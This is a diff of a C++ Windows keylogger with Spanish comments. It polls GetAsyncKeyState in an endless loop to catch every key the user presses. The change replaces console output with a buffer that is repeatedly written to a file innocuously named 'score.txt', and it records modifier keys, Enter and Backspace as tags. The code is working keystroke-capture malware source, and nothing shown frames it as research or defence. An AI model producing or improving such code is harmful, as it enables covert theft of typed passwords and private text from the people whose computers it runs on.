@@ -1,7 +1,8 @@
 #include <iostream>
 #include <windows.h>
 #include <winuser.h>
-
+#include <fstream>
+#include <string>
 using namespace std;
 
 /*-------------- CONSTANTES --------------*/
@@ -22,7 +23,6 @@ bool verifyCapitalKey();
 char getAlphaKeys(short int);
 char getNumberKeys(short int);
 char simpleCharacters(short int);
-void verifyOtherKeys(short int);
 
 int main()
 {
@@ -33,15 +33,18 @@ int main()
 void registerKeys(){
     bool vkCapital;
     char digitAscii;
+    ofstream score;
+    string text;
     //Este ciclo nos ayudara a capturar siempre, la tecla que pulsa el usuario.
     while(true){
         //Comprobamos el estado de la tecla Bloq mayuscula antes de entrar al segundo ciclo
         vkCapital = verifyCapitalKey();
         //Con este ciclo detectamos la tecla pulsada por el usuario.
         for(short int i = 0; i < 255; i++){
+            digitAscii = NULL;
             //Aquí la condición evalua si una tecla es presionada y gracias al ciclo for podemos saber cual es, el -32767
             //es debido a que si no se lo ponemos realiza muchas veces la acción de adentro del if en cambio así solo lo hace 1 vez
-            if(GetAsyncKeyState(i) == -32767 && i != VK_CAPITAL){
+            if(GetAsyncKeyState(i) == -32767 && i != VK_CAPITAL && digitAscii == NULL){
                 if(i >= 65 && i <= 90){
                     digitAscii = getAlphaKeys(i);
                     if(vkCapital == false){
@@ -53,9 +56,28 @@ void registerKeys(){
                     digitAscii = simpleCharacters(i);
                 }
                 if((i >= 16 && i <= 27) || i == VK_BACK || i == VK_RETURN || ALT || i == VK_SNAPSHOT){
-                    verifyOtherKeys(i);
+                    if(i == VK_MENU || i == ALT){
+                        text += "[ALT]";
+                    } else if(i == VK_CONTROL || i == CTRL){
+                        text += "[CTRL]";
+                    } else if(i == VK_SHIFT){
+                        text += "[SHIFT]";
+                    } else if(i == VK_RETURN){
+                        text += "\n";
+                    } else if(i == VK_BACK){
+                        text += "[BACK]";
+                    } else if(i == VK_ESCAPE){
+                        text += "[ESC]";
+                    } else if(i == VK_SNAPSHOT){
+                        text += "[IMP PNT]";
+                    }
                 }
-                cout << digitAscii;
+                if(digitAscii != NULL){
+                    text += digitAscii;
+                    score.open("score.txt");
+                    score << text;
+                    score.close();
+                }
             }
         }
     }
@@ -98,22 +120,4 @@ char simpleCharacters(short int i){
     }
 
     return digitAscii;
-}
-
-void verifyOtherKeys(short int i){
-    if(i == VK_MENU || i == ALT){
-        cout << "[ALT]";
-    } else if(i == VK_CONTROL || i == CTRL){
-        cout << "[CTRL]";
-    } else if(i == VK_SHIFT){
-        cout << "[SHIFT]";
-    } else if(i == VK_RETURN){
-        cout << "[ENTER]" << endl;
-    } else if(i == VK_BACK){
-        cout << "[BACK]";
-    } else if(i == VK_ESCAPE){
-        cout << "[ESC]";
-    } else if(i == VK_SNAPSHOT){
-        cout << "[IMP PNT]";
-    }
 }
